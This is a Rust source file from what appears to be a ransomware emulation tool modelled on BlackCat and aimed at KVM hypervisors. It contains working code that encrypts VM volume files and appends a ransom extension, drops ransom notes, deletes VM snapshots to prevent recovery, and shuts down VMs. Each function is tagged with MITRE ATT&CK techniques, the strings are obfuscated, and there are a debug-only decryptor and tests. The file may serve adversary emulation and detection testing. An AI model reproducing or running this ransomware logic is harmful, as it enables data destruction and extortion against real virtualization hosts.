// For interacting with target KVM server using virsh
#![cfg(unix)]

use std::error::Error;
use std::path::Path;
use std::process::{Command, Stdio};
use std::str;
use std::sync::Mutex;
use crate::encrypt;
use crate::logger::{log_debug, log_error, log_info};
use crate::proc::exec_program;
use encryptliterals::esl;

static RANSOM_NOTE_MUTEX: Mutex<i32> = Mutex::new(0);

/**
 * encrypt_volumes
 *      About:
 *          Encrypts provided volumes and appends custom ransomware extension
 *          to make them unusable and incentivises the payment of the ransom. Also drops the ransomware note in the volume path directory.
 *      Result:
 *          Encrypted files from `volume_paths` and with `extension` appended to denote it has been encrypted.
 *          Ransomware note dropped in the volume paths directory.
 *      MITRE ATT&CK Techniques:
 *          T1486: Data Encrypted for Impact
 *      CTI:
 *          https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB
 *          https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/
 */
pub fn encrypt_volumes(pool: &rayon::ThreadPool, volume_paths: &Vec<String>, key: &[u8; 16], extension: &str, note_file_name: &str, note_contents: &str) {
    let key = key.clone();
    let ext = extension.clone();
    let ransom_note_name = note_file_name.clone();
    let ransom_note_contents = note_contents.clone();
    pool.scope(move |s| {
        for vol_path in volume_paths {
            let vol_path = vol_path.clone();
            let ext = ext.to_owned();
            let ransom_note_name = ransom_note_name.to_owned();
            let ransom_note_contents = ransom_note_contents.to_owned();
            s.spawn(move |_| {
                log_debug(format!("{} {}", esl!("Encrypting volume at"), vol_path));
                match encrypt::encrypt(&vol_path, &ext, &key) {
                    Ok(_) => {
                        log_debug(format!("{} {}", esl!("Successfully encrypted and added extension to volume"), vol_path));

                        // Get directory path and drop ransom note
                        match Path::new(&vol_path).parent() {
                            Some(p) => {
                                match p.to_str() {
                                    Some(dir_path) => {
                                        let _mutex = match RANSOM_NOTE_MUTEX.lock() {
                                            Ok(m) => m,
                                            Err(e) => {
                                                log_error(format!("{}: {}", esl!("Mutex error"), e));
                                                return;
                                            }
                                        };
                                        encrypt::drop_ransom_note(dir_path.to_owned(), &ransom_note_name, &ransom_note_contents);
                                        // mutex should go out of scope here.
                                    },
                                    None => {
                                        log_error(format!("{} {}", esl!("Failed to convert directory path to string for volume path"), vol_path));
                                    }
                                }
                            },
                            None => {
                                log_error(format!("{} {}", esl!("Failed to get directory path for volume path"), vol_path));
                            }
                        }
                    },
                    Err(e) => log_error(format!("{} {}: {:?}", esl!("Failed to encrypt and add extension to volume"), vol_path, e))
                }
            });
        }
    });
}

/**
 * derypt_volumes
 *      About:
 *          Decrypts provided volumes and removes custom ransomware extension. Also removes the ransomware note.
 */
 #[cfg(debug_assertions)]
 pub fn decrypt_volumes(pool: &rayon::ThreadPool, volume_paths: &Vec<String>, key: &[u8; 16], extension: &str, note_file_name: &str) {
    let key = key.clone();
    let ext = extension.clone();
    let ransom_note_name = note_file_name.clone();
    pool.scope(move |s| {
        for vol_path in volume_paths {
            let vol_path = vol_path.clone();
            let ext = ext.to_owned();
            let ransom_note_name = ransom_note_name.to_owned();
            s.spawn(move |_| {
                // Only decrypt files that end in the extension
                if vol_path.ends_with(ext.as_str()) {
                    log_debug(format!("{} {}", esl!("Decrypting volume: "), vol_path));
                    match encrypt::decrypt(&vol_path, GenericArray::from(key)) {
                        Ok(_) => {
                            log_debug(format!("{} {}", esl!("Successfully decrypted and removed extension from volume"), vol_path));
                        },
                        Err(e) => log_error(format!("{} {}: {:?}", esl!("Failed to encrypt and add extension to volume"), vol_path, e))
                    }
                } else if vol_path.ends_with(ransom_note_name.as_str()) {
                    // If the file is the ransom note, remove it
                    match Path::new(&vol_path).parent() {
                        Some(p) => {
                            match p.to_str() {
                                Some(dir_path) => {
                                    encrypt::remove_ransom_note(dir_path.to_owned(), &ransom_note_name);
                                },
                                None => {
                                    log_error(format!("{} {}", esl!("Failed to convert directory path to string for volume path"), vol_path));
                                }
                            }
                        },
                        None => {
                            log_error(format!("{} {}", esl!("Failed to get directory path for volume path"), vol_path));
                        }
                    }
                } else {
                    log_info(format!("{} {}", vol_path, esl!("does not have the encrypted extension, nor is it a ransom note file. Skipping.")));
                }
            });
        }
    });
}

/**
 * check_kvm_version_info
 *      About:
 *          Checks KVM version info by executing "virsh version"
 *      Result:
 *          Checks KVM version info
 *      MITRE ATT&CK Techniques:
 *          T1518: Software Discovery
 *      CTI:
 *          https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB
 *          https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/
 */
pub fn check_kvm_version_info() -> Result<(), Box<dyn Error>> {
    log_info(String::from(esl!("Executing virsh version to find KVM version info.")));
    let output = match exec_program(esl!("virsh").as_str(), &[esl!("version").as_str()]){
        Ok(s) => s,
        Err(e) => {
            Err(format!("{}: {}", esl!("Failed to execute virsh version"), e))?
        }
    };
    log_info(format!("{}: {}", esl!("stdout"), str::from_utf8(&output.stdout)?));
    log_info(format!("{}: {}", esl!("stderr"), str::from_utf8(&output.stderr)?));

    match output.status.code() {
        Some(code) => {
            if code!= 0 {
                Err(format!("{}: {}", esl!("Non-zero exit status for virsh version"), output.status))?
            }
        }
        None => Err(String::from(esl!("virsh process terminated by signal")))?
    }

    Ok(())
}

/**
 * get_vms
 *      About:
 *          Uses virsh command-line tool to get list of all VM names, regardless of running status
 *      Result:
 *          Vector of strings representing available VMs
 *      MITRE ATT&CK Techniques:
 *          T1580: Cloud Infrastructure Discovery
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 *          https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB
 *          https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/
 */
 pub fn get_vms() -> Result<Vec<String>, Box<dyn Error>> {
    log_info(String::from(esl!("Executing virsh list to list all VMs")));

    // pipe to awk. reference: https://doc.rust-lang.org/std/process/index.html#handling-io
    // awk is fine to use since KVM VM names don't seem to support spaces
    let virsh_proc = match Command::new(esl!("virsh"))
        .args(&[esl!("-q").as_str(), esl!("list").as_str(), esl!("--all").as_str()])
        .stdout(Stdio::piped())
        .spawn() {
            Ok(o) => o,
            Err(e) => Err(format!("{}: {}", esl!("Failed to execute virsh -q list"), e))?
        };

    let virsh_stdout = match virsh_proc.stdout {
        Some(s) => s,
        None => Err(String::from(esl!("Failed to get virsh stdout.")))?
    };

    let awk_proc = match Command::new(esl!("awk"))
        .arg(esl!("{print $2}"))
        .stdin(Stdio::from(virsh_stdout))
        .stdout(Stdio::piped())
        .spawn() {
            Ok(o) => o,
            Err(e) => Err(format!("{}: {}", esl!("Failed to execute awk"), e))?
        };

    let awk_output = match awk_proc.wait_with_output() {
        Ok(o) => o,
        Err(e) => Err(format!("{}: {}", esl!("Failed to execute awk and get output"), e))?
    };
    Ok(str::from_utf8(&awk_output.stdout)?.split('\n').map(|x| String::from(x.trim())).filter(|x| x.len() > 0).collect())
}

/**
 * get_volume_paths
 *      About:
 *          Uses virsh command-line tool to get list of all VM volume paths from default pool
 *      Result:
 *          Vector of strings representing VM volume paths
 *      MITRE ATT&CK Techniques:
 *          T1580: Cloud Infrastructure Discovery
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 *          https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB
 *          https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/
 */
 pub fn get_volume_paths() -> Result<Vec<String>, Box<dyn Error>> {
    // pipe to awk. awk is fine to use since KVM VM names don't seem to support spaces
    let virsh_proc = match Command::new(esl!("virsh"))
        .args(&[esl!("-q").as_str(), esl!("vol-list").as_str(), esl!("default").as_str()])
        .stdout(Stdio::piped())
        .spawn() {
            Ok(o) => o,
            Err(e) => Err(format!("{}: {}", esl!("Failed to execute virsh -q vol-list default"), e))?
        };

    let virsh_stdout = match virsh_proc.stdout {
        Some(s) => s,
        None => Err(String::from(esl!("Failed to get virsh stdout.")))?
    };

    let awk_proc = match Command::new(esl!("awk"))
        .arg(esl!("{print $2}").as_str())
        .stdin(Stdio::from(virsh_stdout))
        .stdout(Stdio::piped())
        .spawn() {
            Ok(o) => o,
            Err(e) => Err(format!("{}: {}", esl!("Failed to execute awk"), e))?
        };

    let awk_output = match awk_proc.wait_with_output() {
        Ok(o) => o,
        Err(e) => Err(format!("{}: {}", esl!("Failed to execute awk and get output"), e))?
    };
    Ok(str::from_utf8(&awk_output.stdout)?.split('\n').map(|x| String::from(x.trim())).filter(|x| x.len() > 0).collect())
}

/**
 * get_vm_snapshots
 *      About:
 *          Uses virsh command-line tool to get list of snapshots for a given VM
 *      Result:
 *          Vector of strings representing the VM snapshots
 *      MITRE ATT&CK Techniques:
 *          T1580: Cloud Infrastructure Discovery
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 *          https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB
 */
 pub fn get_vm_snapshots(vm_name: String) -> Result<Vec<String>, Box<dyn Error>> {
    if vm_name.len() == 0 {
        Err(String::from(esl!("Cannot get snapshots for an empty VM name.")))?
    }
    let output = match exec_program(esl!("virsh").as_str(), &[esl!("snapshot-list").as_str(), &vm_name]){
        Ok(s) => s,
        Err(e) => {
            Err(format!("{}: {}", esl!("Failed to execute virsh snapshot-list"), e))?
        }
    };
    let stderr = str::from_utf8(&output.stderr)?;
    if stderr.len() > 0 {
        log_debug(format!("{}: {}", esl!("stderr"), stderr));
    }
    
    match output.status.code() {
        Some(code) => {
            if code!= 0 {
                Err(format!("{} {}: {}", esl!("Non-zero exit status for virsh snapshot-list"), vm_name, output.status))?
            }
        }
        None => Err(String::from(esl!("virsh process terminated by signal")))?
    }

    // Parse output
    let stdout = str::from_utf8(&output.stdout)?.trim_end();
    if stdout.len() == 0 {
        Err(format!("{} {}", esl!("No command output for virsh snapshot-list"), vm_name))?
    }
    parse_snapshot_list_output(&stdout)
}

/**
 * delete_snapshot
 *      About:
 *          Uses virsh command-line tool to delete a given snapshot for a given VM
 *      Result:
 *          Delete snapshot, or error
 *      MITRE ATT&CK Techniques:
 *          T1485: Data Destruction
 *          T1490: Inhibit System Recovery
 *          T1578: Modify Cloud Compute Infrastructure
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 *          https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB
 */
 pub fn delete_snapshot(vm_name: String, snapshot_name: String) -> Result<(), Box<dyn Error>> {
    if vm_name.len() == 0 {
        Err(String::from(esl!("Cannot delete snapshot for an empty VM name.")))?
    }
    if snapshot_name.len() == 0 {
        Err(String::from(esl!("Cannot delete empty snapshot name.")))?
    }
    log_info(format!("{} {} {} {}", esl!("Deleting snapshot"), snapshot_name, esl!("for VM"), vm_name));
    let output = match exec_program(esl!("virsh").as_str(), &[esl!("snapshot-delete").as_str(), esl!("--domain").as_str(), &vm_name, esl!("--snapshotname").as_str(), &snapshot_name]){
        Ok(s) => s,
        Err(e) => {
            Err(format!("{}: {}", esl!("Failed to execute virsh snapshot-delete"), e))?
        }
    };
    let stdout = str::from_utf8(&output.stdout)?;
    if stdout.len() > 0 {
        log_debug(format!("{}: {}", esl!("stdout"), stdout));
    }
    let stderr = str::from_utf8(&output.stderr)?;
    if stderr.len() > 0 {
        log_debug(format!("{}: {}", esl!("stderr"), stderr));
    }
    
    match output.status.code() {
        Some(code) => {
            if code!= 0 {
                Err(format!("{}: {}", esl!("Non-zero exit status for snapshot-delete"), output.status))?
            }
        }
        None => Err(String::from(esl!("virsh process terminated by signal")))?
    }

    Ok(())
}

/**
 * shutdown_vm
 *      About:
 *          Uses virsh command-line tool to shut down the specified VM
 *      Result:
 *          Shut down VM, or error
 *      MITRE ATT&CK Techniques:
 *          T1529: System Shutdown/Reboot
 *      CTI:
 *          https://www.varonis.com/blog/blackcat-ransomware
 */
pub fn shutdown_vm(vm_name: String) -> Result<(), Box<dyn Error>> {
    if vm_name.len() == 0 {
        Err(String::from(esl!("Cannot shut down an empty VM name.")))?
    }
    let output = match exec_program(esl!("virsh").as_str(), &[esl!("shutdown").as_str(), esl!("--domain").as_str(), &vm_name]){
        Ok(s) => s,
        Err(e) => {
            Err(format!("{}: {}", esl!("Failed to execute virsh shutdown"), e))?
        }
    };
    let stdout = str::from_utf8(&output.stdout)?;
    if stdout.len() > 0 {
        log_debug(format!("{}: {}", esl!("stdout"), stdout));
    }
    let stderr = str::from_utf8(&output.stderr)?;
    if stderr.len() > 0 {
        log_debug(format!("{}: {}", esl!("stderr"), stderr));
    }
    
    match output.status.code() {
        Some(code) => {
            if code!= 0 {
                Err(format!("{} {}: {}", esl!("Non-zero exit status for virsh shutdown --domain"), vm_name, output.status))?
            }
        }
        None => Err(String::from(esl!("virsh process terminated by signal")))?
    }

    Ok(())
}

fn parse_snapshot_list_output(output: &str) -> Result<Vec<String>, Box<dyn Error>> {
    let mut snapshots: Vec<String> = Vec::new();
    let lines: Vec<&str> = output.split("\n").collect();
    if lines.len() > 2 {
        match lines[0].find(esl!("Creation Time").as_str()) {
            Some(index) => {
                for line in &lines[2..] { // skip header lines
                    let trimmed = line.trim_end();
                    if trimmed.len() >= index {
                        snapshots.push(String::from((&trimmed[..index]).trim()));
                    }
                }
            },
            None => {
                Err(format!("{}: {}", esl!("Invalid snapshot list output"), output))?
            }
        }
    }
    Ok(snapshots)
}

#[cfg(test)]
mod tests {
    use super::*;

    cfg_if! {
        if #[cfg(debug_assertions)] {
            use std::fs::{File, create_dir, remove_dir_all, read, write};
            use hex_literal::hex;
            use serial_test::serial;
            pub use crate::config::{Host, validate_access_token};
        } else {
        }
    }

    #[test]
    fn test_parse_snapshot_list_output() {
        let input = " Name                     Creation Time               State
---------------------------------------------------------------
 snapshot with space      2023-08-28 19:17:08 +0000   running
 test1_2023-08-16T16:15   2023-08-16 16:15:15 +0000   running
 test1_2023-08-16T16:17   2023-08-16 16:20:44 +0000   running
 test1_2023-08-28T12:17   2023-08-28 12:17:28 +0000   running
";
        let result = parse_snapshot_list_output(input).unwrap();
        let want = vec![
            String::from("snapshot with space"), 
            String::from("test1_2023-08-16T16:15"), 
            String::from("test1_2023-08-16T16:17"), 
            String::from("test1_2023-08-28T12:17"), 
        ];
        assert_eq!(result, want);
    }

    #[cfg(debug_assertions)]
    #[test]
    #[serial]
    fn test_decrypt_volume_paths() {
         // Set up test environment
         let start_dir = "./blackcattestenumenc";

         let ransom_note_path = "./blackcattestenumenc/RECOVER-SKYFL2E-FILES.txt";

        let encrypted_files = vec![
            "./blackcattestenumenc/vol1.skyfl2e",
            "./blackcattestenumenc/vol2.skyfl2e",
            "./blackcattestenumenc/vol3.skyfl2e",
        ];

        let unaffected_files = vec![
            "./blackcattestenumenc/notencrypted",
            "./blackcattestenumenc/notencrypted2",
        ];

        let final_files = vec![
            "./blackcattestenumenc/vol1",
            "./blackcattestenumenc/vol2",
            "./blackcattestenumenc/vol3",
            "./blackcattestenumenc/notencrypted",
            "./blackcattestenumenc/notencrypted2",
        ];

        let volume_paths = vec![
            String::from("./blackcattestenumenc/vol1.skyfl2e"),
            String::from("./blackcattestenumenc/vol2.skyfl2e"),
            String::from("./blackcattestenumenc/vol3.skyfl2e"),
            String::from("./blackcattestenumenc/notencrypted"),
            String::from("./blackcattestenumenc/notencrypted2"),
            String::from("./blackcattestenumenc/RECOVER-SKYFL2E-FILES.txt"),
        ];

        if Path::new(start_dir).exists() {
            remove_dir_all(start_dir).unwrap();
        }
        create_dir(start_dir).unwrap();
        
        let plaintext = [0x01; 2050];
        let ciphertext = hex!("5a337f73d57b5f28f8b5046654e3a75576400ba039bcc2c8d8b83342e23b7d8ccab5d3a3a7558a3867b74d2245bf8b5a3f07b70ecff0482d17cf4a8864aacd2f
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
63d325b0da31913d0c68c54ecb0dcfd46e333c3879526a96ee1f7cfc7af9465feb7102699779b63be2b29a939a8c2c74efdaee5acd91af2c831053423d9c8b98
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
97a376bdf966b1d5e0ed19e8300080cf48eb6d2d3d36ed4ea20811f9d2e6658383ff01e035184829244fb72edd1e6820cdbe62a51612b0810d6f923dc8e1da8f
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
1e9ffabb9b5440adbe2781bc9a45d3718a22f278590b0fca8fbb0004d7657280027007a9c0e7d934b2a2334e67390633d72db41955acf8c904bf47dad05a9be1
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
4daacfd13cfc62a8189ec5738e59c2287e133415692c833950a2d7405dd43113f4db5fb16048bfd4d457a9ffa6a7f333338ed669d5e7c84802a31d2fe53a5c64
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
feaffdb4ff4adf382234aca89a68208bf8167dc88f897e74abd6f4ae05be82f82fa3cb2dad2ce8a836404cc027ad006986490036769954464b099c79388b3e99
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
9472b70e991933770c2b492df50b6bd7e9e84ea590e469e42ed9dc0c02a186aac3af23f18e138daf93b66ab8daa075ff49792aa279a729d3bbd7828b776df6e2
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
04e1abbe448c575a6a2e2f295f879755f91d473ed3872b0018f8bf8737b1ea2ec4d9a964ef6918d66c34bab829af7750bc522a757952781251cf56706500eb62
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
01010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101
c19524242424242424242424242424242424");
        let key = [0x42u8; 16];

        for path in &unaffected_files {
            File::create(path).unwrap();
            write(path, plaintext).unwrap();
        }

        for path in &encrypted_files {
            File::create(path).unwrap();
            write(path, ciphertext).unwrap();
        }

        // Place ransom note
        File::create(ransom_note_path).unwrap();
        write(ransom_note_path, plaintext).unwrap();

        // run volume decryption and cleanup
        let config = validate_access_token("15742aa362a84ba3").unwrap();
        let h = Host::new(config);
        let pool = rayon::ThreadPoolBuilder::new().num_threads(5).build().unwrap();
        decrypt_volumes(&pool, &volume_paths, &key, h.get_extension(), h.get_note_file_name());

        // Verify all files have original plaintext and no extension
        for file in final_files {
            let ext_path = format!("{}{}", file, h.get_extension());
            assert!(!Path::new(&ext_path).exists());
            let contents = read(&file).unwrap();
            assert_eq!(contents.as_slice(), plaintext);
        }

        // Verify no encrypted files remain
        for file in encrypted_files {
            assert!(!Path::new(&file).exists());
        }

        // Verify no ransom note
        assert!(!Path::new(&ransom_note_path).exists());

        // Cleanup
        remove_dir_all(start_dir).unwrap();
    }
}
